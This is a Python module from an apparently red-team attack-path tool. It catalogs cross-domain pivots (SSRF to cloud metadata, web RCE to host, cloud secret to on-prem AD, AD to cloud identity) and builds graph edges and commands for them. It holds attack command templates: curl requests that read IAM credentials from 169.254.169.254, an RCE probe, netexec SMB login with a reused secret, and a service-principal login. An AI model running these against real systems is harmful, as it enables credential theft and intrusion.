"""The cross-domain BRIDGE catalog — the small, new set of SEAMS that connect the three lanes.

This is the genuinely new content of the kill-chain overlay. Within a lane, the abuse edges already
exist (the :cloud and :ad-graph technique catalogs own them). What connects a web foothold to a
cloud principal, a cloud secret to an on-prem AD credential, a web RCE to a host, does NOT live in
any single-lane graph — it is the SEAM between them. This module is the parallel to
``cloudgraph/techniques.py`` / ``adgraph/techniques.py``, but for those seams only.

Two halves, exactly like the per-lane catalogs:

  * a static catalog gives every bridge kind a title, a one-line summary, the tool, KB search seeds,
    a correct fallback command template (general knowledge), the ATT&CK technique it maps to, and
    the two domains it crosses;
  * :func:`synthesize` reads the MERGED graph and adds a bridge edge wherever a lane node declares a
    seam (a ``props["seams"]`` hint — how a live lane exposes "this SSRF finding reached that cloud
    principal", and how the synthetic sample wires the demo). :func:`technique_for_bridge` resolves
    the command for one bridge edge — KB-grounded when a grounder is injected, catalog template
    otherwise.

Nothing here executes anything. A bridge command is display + a step the human may later approve
through the SAME gated executor every cockpit command uses.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Callable

from .schema import Edge, Graph, split_domain

# grounder(seeds) -> {"id", "title", "commands": [{lang, cmd}]} | None. Injected by main.py (wired
# to the KB search). An injected callable => no import cycle with the KB/app layer.
Grounder = Callable[[str], "dict | None"]

# The cross-domain seams, in rough "directness" order (used only to break ties between equal-length
# routes — a more direct seam wins). These are the ONLY edge kinds this overlay authors.
BRIDGE_KINDS: tuple[str, ...] = (
    "SsrfToImds",     # web SSRF Finding -> cloud principal (IMDS creds behind the SSRF)
    "NodeToCloud",    # a compromised compute/K8s node -> its cloud instance-role principal
    "WebToHost",      # web RCE Finding -> a host node (-> then AD via existing adgraph edges)
    "CloudToOnprem",  # cloud -> on-prem AD (secret/password reuse, sync account, RunCommand on a DJ VM)
    "OnpremToCloud",  # on-prem -> cloud (AD-synced identity, SP cert on a domain box, creds in SYSVOL/GPP)
)
_BRIDGE_SET = frozenset(BRIDGE_KINDS)
_BRIDGE_RANK = {k: i for i, k in enumerate(BRIDGE_KINDS)}


def is_bridge(kind: str) -> bool:
    return kind in _BRIDGE_SET


def bridge_rank(kind: str) -> int:
    return _BRIDGE_RANK.get(kind, len(BRIDGE_KINDS))


@dataclass(frozen=True)
class BridgeSpec:
    title: str
    summary: str                 # one line: what crossing this seam gets you
    tool: str                    # the primary tool that makes the crossing
    kb_seeds: str                # KB search terms to find a grounded entry
    template: str                # fallback command (general knowledge), with {placeholders}
    attack_id: str               # the ATT&CK technique the crossing maps to
    domain_from: str             # web | cloud | onprem
    domain_to: str
    destructive: bool = False    # the crossing establishes control on the far side (UI marks it red)


# The catalog, keyed by bridge kind. ``<secret>`` / ``<cert>`` / ``<tenant>`` stay LITERAL — a
# secret is never auto-filled onto a command line (names, not values); the operator supplies it.
_CATALOG: dict[str, BridgeSpec] = {
    "SsrfToImds": BridgeSpec(
        title="SSRF → cloud instance metadata (IMDS)",
        summary="The SSRF at {source_name} reaches 169.254.169.254 — read the instance role's "
                "credentials and become {target_name} in the cloud.",
        tool="curl (via the approved repeater)",
        kb_seeds="ssrf cloud instance metadata imds 169.254.169.254 steal iam role credentials",
        template=("curl -s -H 'X-aws-ec2-metadata-token: <imds-v2-token>' "
                  "http://169.254.169.254/latest/meta-data/iam/security-credentials/{target_name}"),
        attack_id="T1552.005",
        domain_from="web", domain_to="cloud",
    ),
    "NodeToCloud": BridgeSpec(
        title="Compromised node → cloud instance role",
        summary="{source_name} is a compute/K8s node — read its instance-role credentials from IMDS "
                "and act as {target_name} in the cloud account.",
        tool="curl (on the node)",
        kb_seeds="kubernetes node cloud instance role imds metadata credentials pivot eks gke aks",
        template=("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                  "{target_name}"),
        attack_id="T1552.005",
        domain_from="cloud", domain_to="cloud",
    ),
    "WebToHost": BridgeSpec(
        title="Web RCE → host foothold",
        summary="The RCE at {source_name} gives command execution on the host {target_name} — land a "
                "shell, then move on-prem through the existing AD edges.",
        tool="curl (via the approved repeater) / a reverse shell",
        kb_seeds="web rce command execution reverse shell host foothold lateral movement to domain",
        template="curl -s '{source_label}' --data-urlencode 'cmd=id'",
        attack_id="T1190",
        domain_from="web", domain_to="onprem",
    ),
    "CloudToOnprem": BridgeSpec(
        title="Cloud secret → on-prem AD credential",
        summary="A secret read in the cloud is reused as an AD credential — authenticate to the "
                "domain as {target_name} (password/secret reuse, sync account, or RunCommand on a "
                "domain-joined VM).",
        tool="netexec / az vm run-command",
        kb_seeds="cloud secret password reuse active directory entra ad connect sync run-command "
                 "domain joined vm hybrid",
        template="netexec smb {dc_host} -u {target_name} -p '<secret>'",
        attack_id="T1078",
        domain_from="cloud", domain_to="onprem",
        destructive=True,
    ),
    "OnpremToCloud": BridgeSpec(
        title="On-prem AD → cloud identity",
        summary="An on-prem identity bridges to the cloud — an AD-synced account, a service-principal "
                "cert on a domain box, or cloud creds in SYSVOL/GPP get you into the tenant as "
                "{target_name}.",
        tool="az login --service-principal / roadtx",
        kb_seeds="active directory to azure entra ad connect synced identity service principal cert "
                 "sysvol gpp cloud credentials",
        template=("az login --service-principal -u <app-id> -p <cert.pem> --tenant <tenant> "
                  "# reach {target_name}"),
        attack_id="T1078.004",
        domain_from="onprem", domain_to="cloud",
    ),
}


def spec_for(kind: str) -> BridgeSpec | None:
    return _CATALOG.get(kind)


def _name(label: str) -> str:
    """A bare name from an ARN / SID label / URL (the last path or ``:`` segment)."""
    if not label:
        return ""
    tail = label.rsplit(":", 1)[-1]
    return tail.rsplit("/", 1)[-1] or label


def _fill(template: str, ctx: dict[str, str]) -> str:
    out = template
    for k, v in ctx.items():
        out = out.replace("{" + k + "}", v)
    return out


def _cli_head(cmd: str) -> str:
    """The first runnable line's leading tool token (basename, lowered) — e.g. ``netexec``, ``curl``.
    Used to check a KB-grounded command is the SAME crossing tool as the catalog, not merely an entry
    retrieved by the same seed terms (the cloud grounder's ``_cli_key`` guard, one token)."""
    line = next((ln.strip() for ln in (cmd or "").splitlines()
                 if ln.strip() and not ln.strip().startswith("#")), "")
    tok = line.split()[0] if line.split() else ""
    return tok.rsplit("/", 1)[-1].lower()


# --------------------------------------------------------------------------- #
# synthesize — add the seam edges to a merged graph
# --------------------------------------------------------------------------- #
def synthesize(graph: Graph) -> int:
    """Add the cross-domain bridge edges to ``graph`` in place; return how many were added.

    A lane node declares a seam via ``props["seams"]``: a list of ``{"kind": <bridge_kind>, "to":
    "<merged target id>"}`` (optionally ``"props"`` for that edge, e.g. a ``dc_host``). This is how
    a live lane exposes a crossing (the SSRF Finding node names the cloud principal its IMDS creds
    became; the IMDS-seeded cloud principal names the SSRF that produced it) and how the synthetic
    sample wires the three-lane demo. A seam whose target is not in the graph, or whose kind is
    unknown, is skipped (recorded as a warning) rather than inventing a dangling edge.
    """
    added = 0
    # Snapshot the node list first — we mutate graph.edges, not graph.nodes, inside the loop.
    for node in list(graph.nodes.values()):
        seams = node.props.get("seams")
        if not isinstance(seams, list):
            continue
        for seam in seams:
            if not isinstance(seam, dict):
                continue
            kind = str(seam.get("kind") or "")
            target = str(seam.get("to") or "")
            spec = _CATALOG.get(kind)
            if spec is None:
                graph.warnings.append(f"unknown bridge kind {kind!r} declared on {node.label}")
                continue
            if target not in graph.nodes:
                graph.warnings.append(
                    f"bridge {kind} from {node.label} names a target not in the graph ({target})"
                )
                continue
            d_from, _ = split_domain(node.id)
            d_to, _ = split_domain(target)
            eprops = {
                "domain_from": d_from or spec.domain_from,
                "domain_to": d_to or spec.domain_to,
                "attack_id": spec.attack_id,
            }
            if isinstance(seam.get("props"), dict):
                eprops.update(seam["props"])
            if graph.add_edge(Edge(source=node.id, target=target, kind=kind,
                                   abusable=True, bridge=True, props=eprops)):
                added += 1
    return added


# --------------------------------------------------------------------------- #
# technique — resolve the crossing command for one bridge edge
# --------------------------------------------------------------------------- #
def technique_for_bridge(
    edge: Edge | dict, graph: Graph, grounder: Grounder | None = None
) -> dict[str, Any]:
    """Resolve the abuse technique + command for one CROSS-DOMAIN bridge edge.

    Mirrors ``cloudgraph.techniques.technique_for_edge``'s return shape so the frontend drawer is
    identical, plus ``attack_id`` / ``domain_from`` / ``domain_to`` for the lane-crossing UI. When a
    ``grounder`` is injected and returns a KB entry with commands, the edge is ``grounded`` (cites
    the entry) and adopts the entry's first command; otherwise the catalog template is used and the
    step is ``ai_suggested``. Never executes anything.
    """
    if isinstance(edge, dict):
        source, target, kind = edge["source"], edge["target"], edge["kind"]
        eprops = edge.get("props") or {}
    else:
        source, target, kind = edge.source, edge.target, edge.kind
        eprops = edge.props

    spec = _CATALOG.get(kind)
    snode = graph.node(source)
    tnode = graph.node(target)
    if spec is None:
        return {
            "kind": kind, "title": kind, "summary": "(no seam mapped for this bridge)",
            "tool": "", "destructive": False, "grounded": False, "ai_suggested": True,
            "entry_id": None, "entry_title": None, "commands": [], "why": "",
            "attack_id": "", "domain_from": eprops.get("domain_from", ""),
            "domain_to": eprops.get("domain_to", ""),
        }

    ctx = {
        "source": snode.label if snode else source,
        "target": tnode.label if tnode else target,
        "source_label": snode.label if snode else source,
        "target_label": tnode.label if tnode else target,
        "source_name": _name(snode.label if snode else source),
        "target_name": _name(tnode.label if tnode else target),
        "dc_host": str(eprops.get("dc_host") or (tnode.props.get("dc_host") if tnode else "") or "<dc>"),
    }

    summary = _fill(spec.summary, ctx)
    tmpl_cmd = _fill(spec.template, ctx)
    tmpl_head = _cli_head(tmpl_cmd)
    commands: list[dict[str, Any]] = []
    grounded = False
    entry_id = entry_title = None
    why = ""

    # A seam spans lanes (web → cloud → AD), so a KB entry retrieved by the seed terms may describe a
    # DIFFERENT tool than this crossing. Adopt a grounded command ONLY when its tool head matches the
    # catalog's (netexec == netexec); otherwise keep the precise catalog command and still cite the
    # KB entry as the explanation. Enrich, never mis-ground (the cloud grounder's guard).
    if grounder is not None:
        try:
            hit = grounder(spec.kb_seeds)
        except Exception:  # noqa: BLE001 - grounding is best-effort; the template is the fallback
            hit = None
        if hit and hit.get("commands"):
            entry_id = hit.get("id")
            entry_title = hit.get("title")
            grounded = True
            why = f"Grounded in KB technique “{entry_title}”."
            for c in hit["commands"][:3]:
                if _cli_head(c.get("cmd", "")) == tmpl_head and tmpl_head:
                    commands.append({"lang": c.get("lang") or "bash", "cmd": c.get("cmd") or ""})
                    break
            if not commands:
                why += " Command from the precise catalog (the KB entry explains the seam)."

    if not commands:  # fallback: the catalog template (a correct general-knowledge crossing)
        commands = [{"lang": "bash", "cmd": tmpl_cmd}]
        why = why or "General-knowledge seam (no exact KB entry matched)."

    return {
        "kind": kind,
        "title": spec.title,
        "summary": summary,
        "tool": spec.tool,
        "destructive": spec.destructive,
        "grounded": grounded,
        "ai_suggested": not grounded,
        "entry_id": entry_id,
        "entry_title": entry_title,
        "commands": commands,
        "why": why,
        "attack_id": spec.attack_id,
        "domain_from": eprops.get("domain_from") or spec.domain_from,
        "domain_to": eprops.get("domain_to") or spec.domain_to,
    }


__all__ = [
    "BridgeSpec", "Grounder", "BRIDGE_KINDS", "is_bridge", "bridge_rank", "spec_for",
    "synthesize", "technique_for_bridge",
]
